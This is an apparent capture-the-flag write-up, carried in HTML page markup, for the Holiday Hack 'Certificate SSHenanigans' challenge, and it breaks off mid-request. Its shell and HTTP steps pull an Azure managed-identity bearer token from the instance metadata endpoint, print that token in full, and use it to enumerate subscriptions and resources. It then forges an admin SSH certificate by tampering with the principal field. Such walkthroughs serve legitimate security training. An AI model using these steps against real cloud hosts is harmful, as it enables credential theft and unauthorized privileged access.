+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Space Island Door Access Speaker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o21.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Camera Access
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o22.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Diversion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Extras
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Extras
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../easter_eggs.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Easter Eggs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="certificate-sshenanigans">Certificate SSHenanigans<a class="headerlink" href="#certificate-sshenanigans" title="Permanent link">⚓︎</a></h1>
+<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 12 12 2 5 12h1.86L3 18h7v4h4v-4h7l-3.86-6H19Z"/></svg></span><br/>
+<strong>Direct link</strong>: <a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl">Generate a certificate at northpole-ssh-certs</a> and ssh onto <code>ssh-server-vm.santaworkshopgeeseislands.org</code></p>
+<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
+<div class="admonition question">
+<p class="admonition-title">Request</p>
+<p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure <a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl">Function App</a>. What type of cookie cache is Alabaster planning to implement?</p>
+</div>
+<details class="quote">
+<summary>Alabaster Snowball</summary>
+<p>Hello there! Alabaster Snowball at your service.<br/>
+I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org.<br/>
+ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea!<br/>
+It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver!<br/>
+I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers.<br/>
+Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list.<br/>
+If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently.<br/>
+Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>
+</details>
+<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
+<details class="tip">
+<summary>Azure Function App Source Code</summary>
+<p>The <a href="https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control">get-source-control</a> Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p>
+</details>
+<details class="tip">
+<summary>Azure VM Access Token</summary>
+<p>Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the <a href="https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token">Azure REST API</a> instead.</p>
+</details>
+<details class="tip">
+<summary>SSH Certificates Talk</summary>
+<p>Check out Thomas Bouve's <a href="https://youtu.be/4S0Rniyidt4">talk and demo</a> to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p>
+</details>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<p>Before we can SSH onto the machine, we need to generate a certificate. I'm a fan of <a href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent">GitHub's guide</a>, but we don't really need to worry aobut security in this case, so just run:
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh-keygen<span class="w"> </span>-C<span class="w"> </span>&lt;your<span class="w"> </span>SHH<span class="w"> </span>handle&gt;
+</code></pre></div>
+Don't set a passphrase and save the file in your local directory as <code>shh</code>.</p>
+<p>Normally you'd need to copy the public key onto the server so that it can verify you, but as Thomas Bouve's talk notes, this is time-consuming and tedious and can be replaced by key-signing. So copy
+the contents of <code>ssh.pub</code> into <a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl">the Azure Function App</a>.</p>
+<p>The output should look something like:</p>
+<p><img alt="Certificate request" src="../img/objectives/o17/req.png" /></p>
+<p>Copy the "ssh_cert" value into <code>ssh.pub</code> (<strong>without the ending space</strong>) and save the file.</p>
+<p>We can then connect to the <code>monitor</code> account as Alabaster requested:
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;IdentitiesOnly=yes&quot;</span><span class="w"> </span>-i<span class="w"> </span>shh<span class="w"> </span>monitor@ssh-server-vm.santaworkshopgeeseislands.org
+</code></pre></div></p>
+<p>Several previous Holiday Hack challenges have involved fetching metadata from 169.254.169.254 and we know this is on Azure, so let's see if we can find anything about that.
+<a href="https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token#get-a-token-using-http">The second hint links to this page on getting an access token</a>:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span><span class="s2">&quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/&quot;</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Metadata:true&quot;</span>
+<span class="o">{</span><span class="s2">&quot;access_token&quot;</span>:<span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM4OTY1MDIsIm5iZiI6MTcwMzg5NjUwMiwiZXhwIjoxNzAzOTgzMjAyLCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiIxM0ZKdWdsVWpreWJBU1RPajhEakJRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.I8RIr3_mMtkoRr7_7M91osZt_mZI-2ugC-zl2iuixSJhsVQgOcF-YJlZoHdcnCWuu0EmZHLHqjtoQnz1tFuHfg8ecmPOfpiRk4Ah57mU2Y_c92FQyl9se1TZETX1Titt15UsM-xa5iWuMcLQAyQHLs95hEUJS3I98pqPYKyzOfzaw5rXxuzWdD5lioyyHevvEgQgoWTmWbTeNM7Y0UKXJow6gCKnJmhdRECAg3dkrcCj_VcJeYdR1Z8gzjCSTEl6DHX8wJny6s-Gl1GciLm5XxaFrVMBhXzvVA6JPntg_gRuN1-j_tgK5yvdfOtU0XNLu_AlTaR8xTSRZ-R23PqBfg&quot;</span>,<span class="s2">&quot;client_id&quot;</span>:<span class="s2">&quot;b84e06d3-aba1-4bcc-9626-2e0d76cba2ce&quot;</span>,<span class="s2">&quot;expires_in&quot;</span>:<span class="s2">&quot;85187&quot;</span>,<span class="s2">&quot;expires_on&quot;</span>:<span class="s2">&quot;1703983202&quot;</span>,<span class="s2">&quot;ext_expires_in&quot;</span>:<span class="s2">&quot;86399&quot;</span>,<span class="s2">&quot;not_before&quot;</span>:<span class="s2">&quot;1703896502&quot;</span>,<span class="s2">&quot;resource&quot;</span>:<span class="s2">&quot;https://management.azure.com/&quot;</span>,<span class="s2">&quot;token_type&quot;</span>:<span class="s2">&quot;Bearer&quot;</span><span class="o">}</span>
+</code></pre></div>
+<div class="admonition important">
+<p class="admonition-title">Important</p>
+<p>I'll just <code>jq</code> to make future output easier to read. The access token will expire, so you will need to run the above command and then <code>export at="&lt;THE ACCESS_TOKEN VALUE ABOVE&gt;</code> for the following commands to work.</p>
+</div>
+<p>Our first hint refers to the URL <code>https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01</code>, so we now have the authentication token for that and just need:</p>
+<ul>
+<li>the subscriptionId</li>
+<li>the resourceGroupName</li>
+<li>the site name</li>
+</ul>
+<h3 id="finding-the-subscription-id">Finding the Subscription ID<a class="headerlink" href="#finding-the-subscription-id" title="Permanent link">⚓︎</a></h3>
+<p>To find the subscription ID, we probably want to list the subscriptions we have access to. Googling "Azure REST API get subscriptions" takes us to <a href="https://learn.microsoft.com/en-us/rest/api/resources/subscriptions/list?view=rest-resources-2022-12-01&amp;tabs=HTTP">this page</a>, and we have everything we need to make that request so let's go ahead and do that:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span><span class="s2">&quot;https://management.azure.com/subscriptions?api-version=2022-12-01&quot;</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$at</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+%<span class="w"> </span>Total<span class="w">    </span>%<span class="w"> </span>Received<span class="w"> </span>%<span class="w"> </span>Xferd<span class="w">  </span>Average<span class="w"> </span>Speed<span class="w">   </span>Time<span class="w">    </span>Time<span class="w">     </span>Time<span class="w">  </span>Current
+<span class="w">                                 </span>Dload<span class="w">  </span>Upload<span class="w">   </span>Total<span class="w">   </span>Spent<span class="w">    </span>Left<span class="w">  </span>Speed
+<span class="m">100</span><span class="w">   </span><span class="m">245</span><span class="w">  </span><span class="m">100</span><span class="w">   </span><span class="m">245</span><span class="w">    </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w">    </span><span class="m">675</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w">   </span><span class="m">674</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="o">[</span>
+<span class="w">    </span><span class="o">{</span>
+<span class="w">      </span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;authorizationSource&quot;</span>:<span class="w"> </span><span class="s2">&quot;RoleBased&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;managedByTenants&quot;</span>:<span class="w"> </span><span class="o">[]</span>,
+<span class="w">      </span><span class="s2">&quot;tags&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="s2">&quot;sans:application_owner&quot;</span>:<span class="w"> </span><span class="s2">&quot;SANS:R&amp;D&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;finance:business_unit&quot;</span>:<span class="w"> </span><span class="s2">&quot;curriculum&quot;</span>
+<span class="w">      </span><span class="o">}</span>,
+<span class="w">      </span><span class="s2">&quot;subscriptionId&quot;</span>:<span class="w"> </span><span class="s2">&quot;2b0942f3-9bca-484b-a508-abdae2db5e64&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;tenantId&quot;</span>:<span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;displayName&quot;</span>:<span class="w"> </span><span class="s2">&quot;sans-hhc&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;state&quot;</span>:<span class="w"> </span><span class="s2">&quot;Enabled&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;subscriptionPolicies&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="s2">&quot;locationPlacementId&quot;</span>:<span class="w"> </span><span class="s2">&quot;Public_2014-09-01&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;quotaId&quot;</span>:<span class="w"> </span><span class="s2">&quot;EnterpriseAgreement_2014-09-01&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;spendingLimit&quot;</span>:<span class="w"> </span><span class="s2">&quot;Off&quot;</span>
+<span class="w">      </span><span class="o">}</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">  </span><span class="o">]</span>,
+<span class="w">  </span><span class="s2">&quot;count&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="s2">&quot;type&quot;</span>:<span class="w"> </span><span class="s2">&quot;Total&quot;</span>,
+<span class="w">    </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="m">1</span>
+<span class="w">  </span><span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>So the subscription ID is: <code>2b0942f3-9bca-484b-a508-abdae2db5e64</code></p>
+<h3 id="finding-the-resource-group-name">Finding the Resource Group Name<a class="headerlink" href="#finding-the-resource-group-name" title="Permanent link">⚓︎</a></h3>
+<p>Googling for "Azure REST API list resource groups" finds <a href="https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01">this page</a> which we also now have everything we need to run:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span><span class="s2">&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2021-04-01&quot;</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$at</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+%<span class="w"> </span>Total<span class="w">    </span>%<span class="w"> </span>Received<span class="w"> </span>%<span class="w"> </span>Xferd<span class="w">  </span>Average<span class="w"> </span>Speed<span class="w">   </span>Time<span class="w">    </span>Time<span class="w">     </span>Time<span class="w">  </span>Current
+<span class="w">                                 </span>Dload<span class="w">  </span>Upload<span class="w">   </span>Total<span class="w">   </span>Spent<span class="w">    </span>Left<span class="w">  </span>Speed
+<span class="m">100</span><span class="w">   </span><span class="m">245</span><span class="w">  </span><span class="m">100</span><span class="w">   </span><span class="m">245</span><span class="w">    </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w">    </span><span class="m">675</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w">   </span><span class="m">674</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="o">[</span>
+<span class="w">    </span><span class="o">{</span>
+<span class="w">      </span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;name&quot;</span>:<span class="w"> </span><span class="s2">&quot;northpole-rg1&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;type&quot;</span>:<span class="w"> </span><span class="s2">&quot;Microsoft.Resources/resourceGroups&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;location&quot;</span>:<span class="w"> </span><span class="s2">&quot;eastus&quot;</span>,
+<span class="w">      </span><span class="s2">&quot;tags&quot;</span>:<span class="w"> </span><span class="o">{}</span>,
+<span class="w">      </span><span class="s2">&quot;properties&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="s2">&quot;provisioningState&quot;</span>:<span class="w"> </span><span class="s2">&quot;Succeeded&quot;</span>
+<span class="w">      </span><span class="o">}</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">  </span><span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>So the resource group name is <code>northpole-rg1</code></p>
+<h3 id="finding-the-site-name">Finding the Site Name<a class="headerlink" href="#finding-the-site-name" title="Permanent link">⚓︎</a></h3>
+<p>It doesn't seem like there's a REST API for getting the site name, it might just be the hostname: <code>northpole-ssh-certs-fa</code>, so let's try that and revisit if it doesn't work...</p>
+<h3 id="getting-the-source">Getting the Source<a class="headerlink" href="#getting-the-source" title="Permanent link">⚓︎</a></h3>
+<p>Now we can run the command from the hint
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span><span class="s2">&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01&quot;</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$at</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+%<span class="w"> </span>Total<span class="w">    </span>%<span class="w"> </span>Received<span class="w"> </span>%<span class="w"> </span>Xferd<span class="w">  </span>Average<span class="w"> </span>Speed<span class="w">   </span>Time<span class="w">    </span>Time<span class="w">     </span>Time<span class="w">  </span>Current
+<span class="w">                                 </span>Dload<span class="w">  </span>Upload<span class="w">   </span>Total<span class="w">   </span>Spent<span class="w">    </span>Left<span class="w">  </span>Speed
+<span class="m">100</span><span class="w">   </span><span class="m">982</span><span class="w">  </span><span class="m">100</span><span class="w">   </span><span class="m">982</span><span class="w">    </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w">   </span><span class="m">1641</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w"> </span>--:--:--<span class="w">  </span><span class="m">1644</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;name&quot;</span>:<span class="w"> </span><span class="s2">&quot;northpole-ssh-certs-fa&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;type&quot;</span>:<span class="w"> </span><span class="s2">&quot;Microsoft.Web/sites/sourcecontrols&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;location&quot;</span>:<span class="w"> </span><span class="s2">&quot;East US&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;tags&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="s2">&quot;project&quot;</span>:<span class="w"> </span><span class="s2">&quot;northpole-ssh-certs&quot;</span>,
+<span class="w">    </span><span class="s2">&quot;create-cert-func-url-path&quot;</span>:<span class="w"> </span><span class="s2">&quot;/api/create-cert?code=candy-cane-twirl&quot;</span>
+<span class="w">  </span><span class="o">}</span>,
+<span class="w">  </span><span class="s2">&quot;properties&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="s2">&quot;repoUrl&quot;</span>:<span class="w"> </span><span class="s2">&quot;https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa&quot;</span>,
+<span class="w">    </span><span class="s2">&quot;branch&quot;</span>:<span class="w"> </span><span class="s2">&quot;main&quot;</span>,
+<span class="w">    </span><span class="s2">&quot;isManualIntegration&quot;</span>:<span class="w"> </span>false,
+<span class="w">    </span><span class="s2">&quot;isGitHubAction&quot;</span>:<span class="w"> </span>true,
+<span class="w">    </span><span class="s2">&quot;deploymentRollbackEnabled&quot;</span>:<span class="w"> </span>false,
+<span class="w">    </span><span class="s2">&quot;isMercurial&quot;</span>:<span class="w"> </span>false,
+<span class="w">    </span><span class="s2">&quot;provisioningState&quot;</span>:<span class="w"> </span><span class="s2">&quot;Succeeded&quot;</span>,
+<span class="w">    </span><span class="s2">&quot;gitHubActionConfiguration&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="s2">&quot;codeConfiguration&quot;</span>:<span class="w"> </span>null,
+<span class="w">      </span><span class="s2">&quot;containerConfiguration&quot;</span>:<span class="w"> </span>null,
+<span class="w">      </span><span class="s2">&quot;isLinux&quot;</span>:<span class="w"> </span>true,
+<span class="w">      </span><span class="s2">&quot;generateWorkflowFile&quot;</span>:<span class="w"> </span>true,
+<span class="w">      </span><span class="s2">&quot;workflowSettings&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="s2">&quot;appType&quot;</span>:<span class="w"> </span><span class="s2">&quot;functionapp&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;publishType&quot;</span>:<span class="w"> </span><span class="s2">&quot;code&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;os&quot;</span>:<span class="w"> </span><span class="s2">&quot;linux&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;variables&quot;</span>:<span class="w"> </span><span class="o">{</span>
+<span class="w">          </span><span class="s2">&quot;runtimeVersion&quot;</span>:<span class="w"> </span><span class="s2">&quot;3.11&quot;</span>
+<span class="w">        </span><span class="o">}</span>,
+<span class="w">        </span><span class="s2">&quot;runtimeStack&quot;</span>:<span class="w"> </span><span class="s2">&quot;python&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;workflowApiVersion&quot;</span>:<span class="w"> </span><span class="s2">&quot;2020-12-01&quot;</span>,
+<span class="w">        </span><span class="s2">&quot;useCanaryFusionServer&quot;</span>:<span class="w"> </span>false,
+<span class="w">        </span><span class="s2">&quot;authType&quot;</span>:<span class="w"> </span><span class="s2">&quot;publishprofile&quot;</span>
+<span class="w">      </span><span class="o">}</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">  </span><span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></p>
+<p>So the source is a <a href="https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa">GitHub repo</a>. I wonder if that's public...</p>
+<h3 id="accessing-the-source">Accessing the Source<a class="headerlink" href="#accessing-the-source" title="Permanent link">⚓︎</a></h3>
+<p>It is public, and <a href="https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py#L45-L54">it seems pretty interesting to me that the principal is barely validated</a></p>
+<h3 id="the-vulnerability">The vulnerability<a class="headerlink" href="#the-vulnerability" title="Permanent link">⚓︎</a></h3>
+<p>So when we first requested our certificate to be signed, it gave us a principal of "elf".</p>
+<details>
+<summary>Finding the principal</summary>
+<p>It took me a while to figure out what principal I should use; I tried "admin" initially but apparently did something wrong. I then wondered if I should use <code>alabaster</code>, or one of the roles from the KQL challenge (eg "Santa Claus", "Vice President Elf" or some variation thereof). It's case sensitive though (which you can confirm by requesting a principal of "Elf" and seeing that you can't login to the monitor account, so it'd be hard to figure it out alone). Fortunately, you can read <code>/etc/ssh/</code> which has an <code>auth_principals</code> directory:
+<div class="highlight"><pre><span></span><code>monitor@ssh-server-vm:/etc/ssh/auth_principals$<span class="w"> </span>cat<span class="w"> </span>alabaster<span class="w"> </span>
+admin
+</code></pre></div></p>
+</details>
+<p>What happens if we make a new signing request with our original public key but with the additional parameter <code>principal=admin</code>?</p>
+<details>
+<summary>Use Burp Proxy</summary>
+<p>You can use the repeater to send the following request, but replace my pub_key with yours:
+<div class="highlight"><pre><span></span><code>POST /api/create-cert?code=candy-cane-twirl HTTP/2
+Host: northpole-ssh-certs-fa.azurewebsites.net
+Content-Length: 604
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: https://northpole-ssh-certs-fa.azurewebsites.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+
